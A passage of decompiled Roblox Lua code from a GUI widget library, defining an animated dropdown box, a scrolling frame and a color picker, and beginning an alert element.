Enum.EasingDirection.Out)},ItemHoverColor3={"\4\0\0Color3",v1360.HighlightColor},ItemHoverOffset={"\3\0\0number",10},ItemSelectedColor3={"\4\0\0Color3",v1360.HighlightColor},ItemSelectedOffset={"\3\0\0number",5},TitleHoverColor3={"\4\0\0Color3",v1360.TextColor},BorderSizePixel={"\3\0\0number",v1360.BorderSize},HoverBorderSizePixel={"\3\0\0number",v1360.BorderSize},OpenBorderSizePixel={"\3\0\0number",v1360.BorderSize},EndArrowColor3={"\4\0\0Color3",v1357.Silver}}, {Value="SelectedValue",ValueChanged="SelectionChanged"}, function(v2277, v2278, v2279, v2280)
			local v2281 = v1333(v2277);
			local v2282 = v2281.__Fields;
			local v2279 = v2279 or {};
			local v2283 = Instance.new("Frame", v1365(v2278));
			local v2284 = Instance.new("ImageLabel", v2283);
			local v2285 = Instance.new("ImageLabel", v2283);
			local v2286 = Instance.new("TextButton", v2283);
			local v2287 = Instance.new("Frame", v2283);
			local v2288 = Instance.new("Frame", v2287);
			v2283.BackgroundTransparency = 1;
			v2283.BorderSizePixel = 0;
			v2283.Name = v1334 .. "MagnoliaDropdownBox";
			v2284.Name = v1334 .. "Background";
			v2284.BackgroundTransparency = 1;
			v2284.Image = "rbxassetid://3570695787";
			v2284.ScaleType = Enum.ScaleType.Slice;
			v2284.SliceScale = 0.1;
			v2284.Size = UDim2.new(1, 0, 1, 0);
			v2284.SliceCenter = Rect.new(100, 100, 100, 100);
			v2284.Position = UDim2.new(0.5, 0, 0, 0);
			v2284.AnchorPoint = Vector2.new(0.5, 0);
			v2284.ZIndex = v2283.ZIndex;
			v2285.Name = v1334 .. "Arrow";
			v2285.BackgroundTransparency = 1;
			v2285.BorderSizePixel = 0;
			v2285.Image = "rbxassetid://3931363707";
			v2285.AnchorPoint = Vector2.new(1, 0.5);
			v2286.Name = v1334 .. "Title";
			v2286.BackgroundTransparency = 1;
			v2286.AnchorPoint = Vector2.new(0.5, 0);
			v2286.TextXAlignment = Enum.TextXAlignment.Left;
			v2286.Font = v1360.Font;
			v2286.TextColor3 = v1360.TextColor;
			v2286.TextSize = 8;
			v2287.Name = v1334 .. "ElementCanvas";
			v2287.BackgroundTransparency = 1;
			v2287.BorderSizePixel = 0;
			v2287.AnchorPoint = Vector2.new(0.5, 1);
			v2287.Position = UDim2.new(0.5, 0, 1, 0);
			v2287.ClipsDescendants = true;
			v2288.Name = v1334 .. "ElementContainer";
			v2288.BackgroundTransparency = 1;
			v2288.BorderSizePixel = 0;
			v2288.AnchorPoint = Vector2.new(0.5, 0);
			v2288.Position = UDim2.new(0.5, 0, 0, 0);
			v2288.Size = UDim2.new(1, 0, 0, 0);
			v2288.ClipsDescendants = false;
			local v2332 = 0;
			v2283.Changed:Connect(function(v2818)
				if (v2818 == "BackgroundColor3") then
					v2284.ImageColor3 = v2283.BackgroundColor3;
				end
			end);
			v2283.MouseEnter:Connect(function()
				if not v2282.IsOpen then
					v2283.BackgroundColor3 = v2282.BoxHoverColor3;
				end
			end);
			v2283.MouseLeave:Connect(function()
				if not v2282.IsOpen then
					v2283.BackgroundColor3 = v2282.BoxColor3;
				end
			end);
			v2286.MouseEnter:Connect(function()
				v2286.TextColor3 = v2282.TitleHoverColor3;
			end);
			v2286.MouseLeave:Connect(function()
				v2286.TextColor3 = v2282.TextColor3;
			end);
			v2286.MouseButton1Down:Connect(function()
				if not v2282.Enabled then
					return;
				end
				if not v2282.IsOpen then
					v2277:Open();
				else
					v2277:Close();
				end
			end);
			v2287.MouseWheelBackward:Connect(function()
				local v2823 = v2281.List;
				local v2824 = math.min(v2282.MaxDrop - 1, v2282.Count - 1);
				v2282.Scroll = v2282.Scroll + 1;
				if (v2282.Scroll > ((v2282.Count - v2824) - 1)) then
					v2282.Scroll = (v2282.Count - v2824) - 1;
					v1337:Create(v2288, v2282.ElasticyTweenInfo, {Position=UDim2.new(0.5, 0, 0, (-v2282.Scroll - 0.25) * v2282.Size.Y)}):Play();
					v2332 = v2332 + 1;
					local v3170 = v2332;
					wait(v2282.ElasticyTweenInfo.Time);
					if (v3170 ~= v2332) then
						return;
					else
						v2332 = 0;
					end
				end
				v1337:Create(v2288, v2282.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, -v2282.Scroll * v2282.Size.Y)}):Play();
			end);
			v2287.MouseWheelForward:Connect(function()
				local v2826 = v2281.List;
				v2282.Scroll = v2282.Scroll - 1;
				if (v2282.Scroll < 0) then
					v2282.Scroll = 0;
					v1337:Create(v2288, v2282.ElasticyTweenInfo, {Position=UDim2.new(0.5, 0, 0, v2282.Size.Y * 0.25)}):Play();
					v2332 = v2332 + 1;
					local v3172 = v2332;
					wait(v2282.ElasticyTweenInfo.Time);
					if (v3172 ~= v2332) then
						return;
					else
						v2332 = 0;
					end
				end
				v1337:Create(v2288, v2282.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, -v2282.Scroll * v2282.Size.Y)}):Play();
			end);
			v2281.__Instance = v2283;
			v2281.__Base2D = v2283;
			v2281.__ImageRender = v2284;
			v2281.__TextRender = v2286;
			v2281.ElementCanvas = v2287;
			v2281.ElementContainer = v2288;
			v2281.Arrow = v2285;
			v2281.Title = v2286;
			v2281.List = {};
			v2281.MouseHover = false;
			for v2828, v2829 in pairs(v2279) do
				v2282.AddItem(v2277, v2828, v2829);
			end
			if v2280 then
				v2282.Select(v2277, v2280);
			else
			end
			v2282.Redraw(v2277);
		end, function(v2343)
			v2343['SelectedIndex'] = function(v2830, v2831, v2832, v2833)
				v2831.Select(v2833, v2831.SelectedIndex);
			end;
			v2343['Padding'] = function(v2834, v2835)
				local v2836 = v2834.__Instance;
				local v2837 = v2834.__TextRender;
				local v2838 = v2834.Arrow;
				if not v2835.IsOpen then
					v2836.Size = UDim2.new(0, v2835.Size.X, 0, v2835.Size.Y);
				else
					v2836.Size = UDim2.new(0, v2835.Size.X, 0, v2835.Size.Y * (v2835.MaxDrop + 1));
				end
				v2834.Title.Position = UDim2.new(0.5, v2835.Padding.X, 0, 0);
				v2837.Size = UDim2.new(1, -v2835.Padding.X, 0, v2835.Size.Y);
				v2838.Position = UDim2.new(1, -v2835.Padding.X, 0, math.floor(v2835.Size.Y / 2));
				v2838.Size = UDim2.new(0, v2835.ArrowSize, 0, v2835.ArrowSize);
				v2834.ElementCanvas.Size = UDim2.new(1, 0, 1, -v2835.Size.Y);
				for v3018, v3019 in pairs(v2834.List) do
					local v3020 = v3019.Item;
					v1337:Create(v3020, TweenInfo.new(0), {Position=UDim2.new(0, v2835.Padding.X, 0, v2835.Size.Y * v3019.Ndx),Size=UDim2.new(1, 0, 0, v2835.Size.Y)}):Play();
				end
			end;
			v2343['Size'] = v2343['Padding'];
			v2343['ArrowSize'] = v2343['Padding'];
			v2343['Text'] = function(v2844, v2845)
				local v2846 = v2844.__TextRender;
				if v2845.ShowSelected then
					if v2845.UseIndex then
						if (v2845.SelectedIndex ~= nil) then
							v2846.Text = tostring(v2845.SelectedIndex);
						else
							v2846.Text = v2845.Text;
						end
					elseif (v2845.SelectedValue ~= nil) then
						v2846.Text = tostring(v2845.SelectedValue);
					else
						v2846.Text = v2845.Text;
					end
				else
					v2846.Text = v2845.Text;
				end
				v2846.TextColor3 = v2845.TextColor3;
				for v3021, v3022 in pairs(v2844.List) do
					local v3023 = v3022.Item;
					v3023.Font = v2846.Font;
					v3023.TextSize = v2846.TextSize;
					v3023.TextColor3 = v2846.TextColor3;
				end
			end;
			v2343['TextColor3'] = v2343['Text'];
			v2343['MaxDrop'] = function(v2849, v2850)
				if (v2850.IsOpen == false) then
					return;
				end
				v2849.__Instance.Size = UDim2.new(0, v2850.Size.X, 0, v2850.Size.Y * (v2850.MaxDrop + 1));
				if (v2850.Scroll < 0) then
					v2850.Scroll = 0;
				end
				local v2852 = (#v2849.List - v2850.MaxDrop) - 1;
				if (v2850.Scroll > v2852) then
					v2850.Scroll = v2852;
				end
				v1337:Create(v2849.ElementContainer, v2850.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, -v2850.Scroll * v2850.Size.Y)}):Play();
			end;
			v2343['Scroll'] = v2343['MaxDrop'];
			v2343['UseIndex'] = function(v2853, v2854)
				for v3030, v3031 in pairs(v2853.List) do
					local v3032 = v3031.Item;
					if v2854.UseIndex then
						v3032.Text = v3031.Idx;
					else
						v3032.Text = tostring(v3031.Val);
					end
				end
			end;
			v2343['ItemSelectedColor3'] = function(v2855, v2856)
				if v2855.SelectedText then
					v2855.SelectedText.TextColor3 = v2856.ItemSelectedColor3;
				end
			end;
			v2343['BoxColor3'] = function(v2857, v2858)
				local v2859 = v2857.__Instance;
				local v2860 = v2857.__ImageRender;
				if v2858.IsOpen then
					v2859.BackgroundColor3 = v2858.BoxOpenedColor3;
					v2860.BorderSizePixel = v2858.OpenBorderSizePixel;
				elseif v2857.MouseHover then
					v2859.BackgroundColor3 = v2858.BoxHoverColor3;
					v2860.BorderSizePixel = v2858.HoverBorderSizePixel;
				else
					v2859.BackgroundColor3 = v2858.BoxColor3;
					v2860.BorderSizePixel = v2858.BorderSizePixel;
				end
			end;
			v2343['BoxHoverColor3'] = v2343['BoxColor3'];
			v2343['BorderSizePixel'] = v2343['BoxColor3'];
			v2343['OpenBorderSizePixel'] = v2343['BoxColor3'];
			v2343['HoverBorderSizePixel'] = v2343['BoxColor3'];
			v2343['ArrowColor3'] = function(v2861, v2862)
				if v2862.IsOpen then
					v2861.Arrow.ImageColor3 = v2862.EndArrowColor3;
				else
					v2861.Arrow.ImageColor3 = v2862.ArrowColor3;
				end
			end;
			v2343['EndArrowColor3'] = v2343['ArrowColor3'];
		end, {AddItem=function(v2361, v2362, v2363)
			if (v2363 == nil) then
				return error("Val cannot be nil.");
			end
			local v2364 = v1333(v2361);
			local v2365 = v2364.ElementCanvas;
			local v2366 = v2364.ElementContainer;
			local v2367 = v2364.__TextRender;
			local v2368 = v2364.List;
			local v2369 = v2364.__Fields;
			local v2370 = v2369.Padding;
			local v2371 = v2364.ListChanged;
			if not v2362 then
				v2362 = v2369.Count + 1;
			end
			if v2368[v2362] then
				return error("Idx already present in the list");
			end
			local v2372 = Instance.new("TextButton", v2366);
			v2372.Name = v1334 .. tostring(v2362);
			v2372.BackgroundTransparency = 1;
			v2372.BorderSizePixel = 0;
			v2372.TextColor3 = v2369.TextColor3;
			v2372.Font = v2367.Font;
			v2372.TextSize = v2367.TextSize;
			v2372.TextColor3 = v2369.TextColor3;
			v2372.TextXAlignment = Enum.TextXAlignment.Left;
			if v2369.UseIndex then
				v2372.Text = v2362;
			else
				v2372.Text = v2363;
			end
			local v2384 = v2369.Count;
			v2369.Count = v2369.Count + 1;
			v2372.Position = UDim2.new(0, v2369.Padding.X, 0, v2369.Size.Y * v2384);
			v2372.Size = UDim2.new(1, 0, 0, v2369.Size.Y);
			v2368[v2362] = {Ndx=v2384,Val=v2363,Item=v2372};
			v2372.MouseEnter:Connect(function()
				if (v2369.SelectedIndex == v2362) then
					return;
				end
				v1337:Create(v2372, v2369.SlideTweenInfo, {TextColor3=v2369.ItemHoverColor3,Position=UDim2.new(0, v2369.ItemHoverOffset, 0, v2369.Size.Y * v2368[v2362].Ndx)}):Play();
			end);
			v2372.MouseLeave:Connect(function()
				if (v2369.SelectedIndex == v2362) then
					return;
				end
				v1337:Create(v2372, v2369.SlideTweenInfo, {TextColor3=v2369.TextColor3,Position=UDim2.new(0, v2369.Padding.X, 0, v2369.Size.Y * v2368[v2362].Ndx)}):Play();
			end);
			local v2389 = function()
				if (v2369.SelectedIndex == v2362) then
					if v2369.CanUnselect then
						v2361:Unselect();
					end
				else
					v2361:Select(v2362);
				end
			end;
			v2372.MouseButton1Click:Connect(v2389);
			v2372.MouseButton2Click:Connect(v2389);
			if v2369.IsOpen then
				v2369.Open(v2361, true);
			end
			v2371:Fire(true, v2362);
			return v2372;
		end,RemoveItem=function(v2390, v2391)
			local v2392 = v1333(v2390);
			local v2393 = v2392.List;
			local v2394 = v2392.__Fields;
			local v2395 = v2394.Padding;
			local v2396 = v2392.ListChanged;
			local v2397 = v2393[v2391];
			if (v2397 == nil) then
				return;
			end
			v2397.Item:Remove();
			v2397.Item:Destroy();
			if (type(v2391) ~= "number") then
				v2393[v2391] = nil;
				local v3036 = 0;
				for v3189, v3190 in next, v2393 do
					local v3191 = v3190.Item;
					v3190.Ndx = v3036;
					v3191.Position = UDim2.new(0, v2394.Padding.X, 0, v2394.Size.Y * v3036);
					v3036 = v3036 + 1;
				end
			else
				table.remove(v2393, v2391);
				for v3194 = v2391, #v2393, 1 do
					local v3195 = v2393[v3194].Item;
					v2393[v3194].Ndx = v3194;
					v3195.Position = UDim2.new(0, v2394.Padding.X, 0, v2394.Size.Y * v3194);
				end
			end
			v2397 = nil;
			if (v2394.SelectedIndex == v2391) then
				v2394.SelectedIndex = nil;
				v2394.SelectedValue = nil;
			end
			v2394.Count = v2394.Count - 1;
			if v2394.IsOpen then
				v2394.Open(v2390, true);
			end
			v2396:Fire(false, v2391);
			return;
		end,GetOpenSize=function(v2399)
			local v2400 = v1333(v2399);
			local v2401 = v2400.__Fields;
			local v2402 = v2401.MaxDrop;
			return math.min(v2401.MaxDrop + 1, v2401.Count + 1) * v2401.Size.Y;
		end,Open=function(v2403, v2404)
			local v2405 = v1333(v2403);
			local v2406 = v2405.__Fields;
			local v2407 = v2405.__Instance;
			local v2408 = v2405.Arrow;
			if (v2406.IsOpen and (v2404 == nil)) then
				return;
			end
			v2406.IsOpen = true;
			v1337:Create(v2407, v2406.ExpandTweenInfo, {Size=UDim2.new(0, v2406.Size.X, 0, v2406.GetOpenSize(v2403)),BackgroundColor3=v2406.BoxOpenedColor3}):Play();
			v1337:Create(v2408, v2406.ExpandTweenInfo, {Rotation=180}):Play();
			v2406.IsOpen = true;
			if not v2404 then
				v2405.Opened:Fire();
				if v2406.ToggleSound then
					v2406.ToggleSound:Play();
				end
			end
		end,Close=function(v2410)
			local v2411 = v1333(v2410);
			local v2412 = v2411.List;
			local v2413 = v2411.__Fields;
			local v2414 = v2411.__Instance;
			local v2415 = v2411.Arrow;
			if (v2413.IsOpen == false) then
				return;
			end
			v2413.IsOpen = false;
			v1337:Create(v2414, v2413.ExpandTweenInfo, {Size=UDim2.new(0, v2413.Size.X, 0, v2413.Size.Y),BackgroundColor3=v2413.BoxColor3}):Play();
			v1337:Create(v2415, v2413.ExpandTweenInfo, {Rotation=0}):Play();
			v2413.IsOpen = false;
			v2411.Closed:Fire();
			if v2413.ToggleSound then
				v2413.ToggleSound:Play();
			end
		end,Select=function(v2417, v2418)
			local v2419 = v1333(v2417);
			local v2420 = v2419.__Fields;
			local v2421 = v2419.List;
			local v2422 = v2421[v2418];
			if v2422 then
				v2420.SelectedIndex = v2418;
				v2420.SelectedValue = v2422.Val;
				v2419.SelectedText = v2422.Item;
				v2419.Draw['Text'](v2419, v2420);
				v2419.ItemTween = v1337:Create(v2422.Item, v2420.SlideTweenInfo, {TextColor3=v2420.ItemSelectedColor3,Position=UDim2.new(0, v2420.ItemSelectedOffset, 0, v2420.Size.Y * v2422.Ndx)});
				v2419.ItemTween:Play();
				v2419.SelectionChanged:Fire(v2418, v2422.Val);
				return true;
			else
				return false;
			end
		end,Unselect=function(v2423)
			local v2424 = v1333(v2423);
			local v2425 = v2424.__Fields;
			local v2426 = v2424.List;
			local v2427;
			for v2863, v2864 in pairs(v2426) do
				if (v2864.Idx == v2425.SelectedIndex) then
					v2427 = v2864;
					break;
				end
			end
			v2425.SelectedIndex = nil;
			v2425.SelectedValue = nil;
			v2424.SelectedText = nil;
			v2425.Redraw(v2423, "Text");
			v1337:Create(v2427.Item, v2425.SlideTweenInfo, {TextColor3=v2425.ItemSelectedColor3,Position=UDim2.new(0, v2425.Padding.X, 0, v2425.Size.Y * v2427.Ndx)}):Play();
			v2424.SelectionChanged:Fire();
		end});
		v1362("ScrollingFrame", {Container={"\2\1\1"},MaxLayer={"\3\0\0number",10},AutoAdjust={"\3\0\0boolean",false},ScrollTweenInfo={"\4\0\0TweenInfo"},GripSize={"\3\0\0number",3},GripVisible={"\3\0\0boolean",false},IsTravelling={"\3\0\1boolean",false},CanScroll={"\3\0\0boolean",true},FreeScroll={"\3\0\0boolean",false},Step={"\3\0\0number",1},StepSize={"\3\0\0number",25},Layer={"\3\0\1number",0},OnTop={"\3\0\1boolean",true},OnBottom={"\3\0\1boolean",false},Travelling={"\4\0\1Event"},ScrollingUp={"\4\0\1Event"},ScrollingDown={"\4\0\1Event"},BottomTouched={"\4\0\1Event"},TopTouched={"\4\0\1Event"}}, {}, function(v2431, v2432, v2433)
			local v2434 = v1333(v2431);
			local v2435 = v2434.__Fields;
			v2435.GripColor = v1357.ElectricBlue;
			v2435.ScrollTweenInfo = v2433;
			local v2439 = Instance.new("Frame", v1365(v2432));
			local v2440 = Instance.new("Frame", v2439);
			local v2441 = Instance.new("Frame", v2439);
			v2435.Container = v2441;
			v2434.Container = v2441;
			v2439.Name = v1334 .. "ScrollingFrame";
			v2439.BackgroundTransparency = 1;
			v2439.Size = UDim2.new(0, 200, 0, 200);
			v2440.Name = "Grip";
			v2440.BorderSizePixel = 0;
			v2440.AnchorPoint = Vector2.new(1, 0);
			v2440.Position = UDim2.new(1, 0, 0, 0);
			v2441.Name = v1334 .. "Container";
			v2441.AnchorPoint = Vector2.new(0.5, 0);
			v2441.Position = UDim2.new(0.5, 0, 0, 0);
			v2441.BackgroundTransparency = 1;
			v2441.Size = UDim2.new(1, 0, 1, 0);
			v2441.ClipsDescendants = true;
			v2439.Changed:Connect(function(v2865)
				if (v2865 == "Size") then
					v2435.Redraw(v2431, "StepSize");
				end
			end);
			v2434.__Instance = v2439;
			v2434.__Base2D = v2439;
			v2434.__Background = v2441;
			v2434.Grip = v2440;
			local v2461 = function()
				local v2866 = v2435.GetFullSize(v2431);
				local v2867 = v1358.Map(v2435.Layer, 0, v2435.MaxLayer, 0, v2866);
				v2440.Position = UDim2.new(1, 0, 0, v2867);
				local v2869 = tostring((v2867 / v2866) * 100) / 100;
				v2440.AnchorPoint = Vector2.new(1, v2869);
			end;
			v2439.MouseWheelForward:Connect(function()
				if v2435.CanScroll then
					if (v2435.Layer <= 0) then
						v1337:Create(v2441, v2435.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, (-v2435.Layer * v2435.StepSize) + v2435.StepSize)}):Play();
						wait(v2435.ScrollTweenInfo.Time);
					elseif (v2435.Layer > 0) then
						v2434.Travelling:Fire();
						v2435.IsTravelling = true;
						v2435.OnTop = false;
						v2435.Layer = v2435.Layer - v2435.Step;
						if (v2435.Layer <= 0) then
							v2435.OnBottom = false;
							v2435.OnTop = true;
							v2435.IsTravelling = false;
							v2434.TopTouched:Fire();
						end
					end
					v1337:Create(v2441, v2435.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, -v2435.Layer * v2435.StepSize)}):Play();
					v2461();
				end
			end);
			v2439.MouseWheelBackward:Connect(function()
				if v2435.CanScroll then
					if (v2435.Layer >= v2435.MaxLayer) then
						v1337:Create(v2441, v2435.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, (-v2435.Layer * v2435.StepSize) - v2435.StepSize)}):Play();
						wait(v2435.ScrollTweenInfo.Time);
					else
						v2434.Travelling:Fire();
						v2435.IsTravelling = true;
						v2435.OnBottom = false;
						v2435.Layer = v2435.Layer + v2435.Step;
						if (v2435.Layer >= v2435.MaxLayer) then
							v2435.OnBottom = true;
							v2435.OnTop = false;
							v2435.IsTravelling = false;
							v2434.BottomTouched:Fire();
						end
					end
					v1337:Create(v2441, v2435.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, -v2435.Layer * v2435.StepSize)}):Play();
					v2461();
				end
			end);
			v2435.Redraw(v2431);
			return v2431;
		end, function(v2462)
			v2462['GripVisible'] = function(v2871, v2872)
				v2871.Grip.Visible = v2872.GripVisible;
				v2871.Grip.Size = UDim2.new(0, v2872.GripSize, 0, v2871.Grip.Size.Y.Offset);
			end;
			v2462['GripSize'] = v2462['GripVisible'];
			v2462['MaxLayer'] = function(v2876, v2877)
				local v2878 = v2877.GetFullSize(v2876.__Proxy);
				local v2879 = v2877.GetVisibleLayers(v2876.__Proxy, v2878);
				v2876.Grip.Size = UDim2.new(0, v2877.GripSize, 0, v2878 / v2879);
			end;
			v2462['StepSize'] = v2462['MaxLayer'];
			v2462['GripColor'] = function(v2881, v2882)
				v2881.Grip.BackgroundColor3 = v2882.GripColor;
			end;
		end, {GetFullSize=function(v2468)
			local v2469 = v1333(v2468);
			local v2470 = v2469.__Fields;
			local v2471 = v2469.__Instance;
			return v2471.AbsoluteSize.Y;
		end,GetVisibleLayers=function(v2472)
			local v2473 = v1333(v2472);
			local v2474 = v2473.__Fields;
			local v2475 = v2473.__Instance;
			return math.floor(v2475.AbsoluteSize.Y / v2474.StepSize);
		end,Scroll=function(v2476, v2477)
			local v2478 = v1333(v2476);
			local v2479 = v2478.__Fields;
		end,Reset=function(v2480)
			local v2481 = v1333(v2480);
			local v2482 = v2481.__Fields;
			local v2483 = v2481.__Background;
			v2482.Layer = 0;
			v1337:Create(v2483, v2482.ScrollTweenInfo, {Position=UDim2.new(0.5, 0, 0, v2482.Layer * v2482.StepSize)}):Play();
		end});
		v1362("ColorPicker", {Size={"\4\0\0Vector2",Vector2.new(200, 130)},PointerSize={"\3\0\0number",20},BottomPadding={"\3\0\0number",20},ValueDragging={"\3\0\1boolean",false},Dragging={"\3\0\1boolean",false},BorderDistance={"\3\0\0number",5},IsOpen={"\3\0\1boolean",false},Color={"\4\0\0Color3"},SecondaryColor={"\4\0\0Color3",v1357.DimMidnightBlue},TextColor={"\4\0\0Color3",Color3.new(1, 1, 1)},ColorChanged={"\4\0\1Event"}}, {Value="Color",ValueChanged="ColorChanged"}, function(v2485, v2486, v2487)
			local v2488 = v1333(v2485);
			local v2489 = v2488.__Fields;
			v2489.Color = ((typeof(v2487) == "Color3") and v2487) or Color3.new(1, 1, 1);
			local v2491 = Instance.new("Frame", v2486);
			local v2492 = Instance.new("Frame", v2491);
			local v2493 = Instance.new("ImageButton", v2492);
			local v2494 = Instance.new("ImageLabel", v2493);
			local v2495 = Instance.new("ImageButton", v2492);
			local v2496 = Instance.new("Frame", v2495);
			local v2497 = Instance.new("TextLabel", v2492);
			v2491.Name = v1334 .. "ColorPicker";
			v2491.BorderColor3 = Color3.fromRGB(255, 255, 255);
			v2491.BackgroundTransparency = 1;
			v2491.ClipsDescendants = true;
			v2492.Name = v1334 .. "Container";
			v2492.AnchorPoint = Vector2.new(0, 0);
			v2493.Name = v1334 .. "Canvas";
			v2493.Image = "rbxassetid://4018903152";
			v2493.ClipsDescendants = true;
			v2493.BackgroundTransparency = 1;
			v2493.Active = true;
			v2494.Name = v1334 .. "Pointer";
			v2494.Image = "rbxassetid://4019495410";
			v2494.AnchorPoint = Vector2.new(0.5, 0.5);
			v2494.BackgroundTransparency = 1;
			v2495.Name = v1334 .. "ValueCanvas";
			v2495.BorderSizePixel = 0;
			v2495.Image = "rbxassetid://4019265005";
			v2495.AnchorPoint = Vector2.new(1, 0);
			v2495.BackgroundTransparency = 1;
			v2496.Name = v1334 .. "ValuePointer";
			v2496.Size = UDim2.new(1, 0, 0, 6);
			v2496.BorderSizePixel = 0;
			v2497.Name = v1334 .. "ColorInfo";
			v2497.Text = v2489.GetFormat(v2485);
			v2497.BackgroundTransparency = 1;
			v2497.AnchorPoint = Vector2.new(0, 1);
			v2497.Position = UDim2.new(0, v2489.BorderDistance, 1, 0);
			v2497.TextXAlignment = Enum.TextXAlignment.Left;
			v2489.ColorChanged:Connect(function()
				v2497.Text = v2489.GetFormat(v2485);
			end);
			local v2528;
			local v2529;
			v1332.onDownUp(v2493, function()
				v2489.Dragging = true;
				v2528 = v1350.Move:Connect(v2488.MoveClosure);
			end, function()
				v2489.Dragging = false;
				if v2528 then
					v2528:Disconnect();
				end
			end);
			v1332.onDownUp(v2495, function()
				v2489.ValueDragging = true;
				v2529 = v1350.Move:Connect(v2488.MoveClosure);
			end, function()
				v2489.ValueDragging = false;
				if v2529 then
					v2529:Disconnect();
				end
			end);
			v2488.MoveClosure = function(v2890)
				if v2489.Dragging then
					local v3198 = UDim2.new(math.clamp((v1350.X - v2493.AbsolutePosition.X) / v2493.AbsoluteSize.X, 0, 1), 0, math.clamp((v1350.Y - v2493.AbsolutePosition.Y) / v2493.AbsoluteSize.Y, 0, 1), 0);
					v1337:Create(v2494, v1332.tweenInfo.move, {Position=v3198}):Play();
					wait(v1332.tweenInfo.move.Time);
					v2489.SelectColor(v2485);
				end
				if v2489.ValueDragging then
					local v3199 = UDim2.new(0, 0, math.clamp((v1350.Y - v2495.AbsolutePosition.Y) / v2495.AbsoluteSize.Y, 0, 1), 0);
					local v3200 = Vector2.new(0, v2496.Position.Y.Scale);
					v1337:Create(v2496, v1332.tweenInfo.move, {Position=v3199,AnchorPoint=v3200}):Play();
					wait(v1332.tweenInfo.move.Time);
					v2489.SelectColor(v2485);
				end
			end;
			v2488.RainbowOffset = 0;
			v2488.__Instance = v2491;
			v2488.__Base2D = v2491;
			v2488.__ImageRender = v2494;
			v2488.ColorInfo = v2497;
			v2488.Canvas = v2493;
			v2488.Container = v2492;
			v2488.ValueCanvas = v2495;
			v2488.ValuePointer = v2496;
			v2489.Redraw(v2485);
			v2489.Close(v2485, true);
		end, function(v2540)
			v2540['Size'] = function(v2891, v2892)
				v2891.__Instance.Size = UDim2.new(0, v2892.IsOpen and v2892.Size.X, 0, v2892.Size.Y);
				v2891.Container.Size = UDim2.new(0, v2892.Size.X, 0, v2892.Size.Y);
				v2891.__ImageRender.Size = UDim2.new(0, v2892.PointerSize, 0, v2892.PointerSize);
				v2891.__ImageRender.ImageColor3 = v2892.Color;
				v2892.SelectColor(v2891.__Proxy, v2892.Color);
			end;
			v2540['PointerSize'] = v2540['Size'];
			v2540['BorderDistance'] = function(v2898, v2899)
				local v2900 = v2898.ValueCanvas;
				v2900.Position = UDim2.new(1, -v2899.BorderDistance, 0, v2899.BorderDistance);
				v2900.Size = UDim2.new(0, 26, 1, (-v2899.BorderDistance * 2) - v2899.BottomPadding);
				v2898.Canvas.Position = UDim2.new(0, v2899.BorderDistance, 0, v2899.BorderDistance);
				v2898.Canvas.Size = UDim2.new(0, (v2899.Size.X - (v2899.BorderDistance * 3)) - v2900.Size.X.Offset, 1, v2900.Size.Y.Offset);
			end;
			v2540['BottomPadding'] = function(v2905, v2906)
				v2905.ColorInfo.Size = UDim2.new(1, 0, 0, v2906.BottomPadding);
			end;
			v2540['SecondaryColor'] = function(v2908, v2909)
				v2908.Container.BackgroundColor3 = v2909.SecondaryColor;
				v2908.__ImageRender.ImageColor3 = v2909.SecondaryColor;
				v2908.ValuePointer.BackgroundColor3 = v2909.SecondaryColor;
			end;
			v2540['TextColor'] = function(v2914, v2915)
				v2914.ColorInfo.TextColor3 = v2915.TextColor;
			end;
		end, {GetFormat=function(v2547)
			local v2548 = v1333(v2547);
			local v2549 = v2548.__Fields;
			local v2550 = v2549.Color;
			local v2551 = string.format("H: %.1f S: %.1f V: %.1f", v2550:ToHSV());
			return v2551;
		end,SelectColor=function(v2552, v2553)
			local v2554 = v1333(v2552);
			local v2555 = v2554.__Fields;
			local v2556 = v2554.__ImageRender;
			local v2557 = v2554.ValuePointer;
			local v2558 = v2554.ValueCanvas;
			local v2559, v2560, v2561;
			if (typeof(v2553) == "Color3") then
				local v3045 = Color3.new(v2553.R, v2553.G, v2553.B);
				v2559, v2560, v2561 = v3045:ToHSV();
				v2556.Position = UDim2.new(v2559, 0, 1 - v2560, 0);
				v2557.Position = UDim2.new(0, 0, 1 - v2561, 0);
				v2558.ImageColor3 = Color3.fromHSV(v2559, v2560, 1);
				v2555.Color = Color3.fromHSV(v2559, v2560, v2561);
				v2554.ColorChanged:Fire(v2555.Color);
			else
				v2559 = v2556.Position.X.Scale;
				v2560 = v2556.Position.Y.Scale;
				v2561 = v2557.Position.Y.Scale;
				v2558.ImageColor3 = Color3.fromHSV(v2559, 1 - v2560, 1);
				v2555.Color = Color3.fromHSV(v2559, 1 - v2560, 1 - v2561);
				v2554.ColorChanged:Fire(v2555.Color);
			end
		end,Open=function(v2562)
			local v2563 = v1333(v2562);
			local v2564 = v2563.__Fields;
			local v2565 = v2563.__Instance;
			if (v2564.IsOpen == false) then
				v2564.IsOpen = true;
				v1337:Create(v2565, v1332.tweenInfo.move, {Size=UDim2.new(0, v2564.Size.X, 0, v2564.Size.Y)}):Play();
			end
		end,Close=function(v2566, v2567)
			local v2568 = v1333(v2566);
			local v2569 = v2568.__Fields;
			local v2570 = v2568.__Instance;
			local v2571 = v2568.MoveConnection;
			if v2569.IsOpen then
				v2569.IsOpen = false;
				v1337:Create(v2570, v1332.tweenInfo.move, {Size=UDim2.new(0, 0, 0, v2569.Size.Y)}):Play();
				if v2571 then
					v2571:Disconnect();
					v2568.MoveConnection = nil;
				end
			end
		end});
	end
	do
		local v1681 = 6;
		local v1682 = 20;
		local v1683 = TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.In);
		local v1684 = TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out);
		local v1685 = 2;
		local v1686 = Color3.new(1, 1, 1);
		local v1687 = v1357.DimMidnightBlue;
		local v1688 = {};
		local v1689 = {};
		local v1690 = {};
		local v1691;
		do
			v1691 = Instance.new("ImageLabel");
			v1691.Name = v1334 .. "MagnoliaAlert";
			v1691.Image = "rbxassetid://3570695787";
			v1691.ScaleType = Enum.ScaleType.Slice;
			v1691.SliceScale = 0.12;
			v1691.SliceCenter = Rect.new(100, 100, 100, 100);
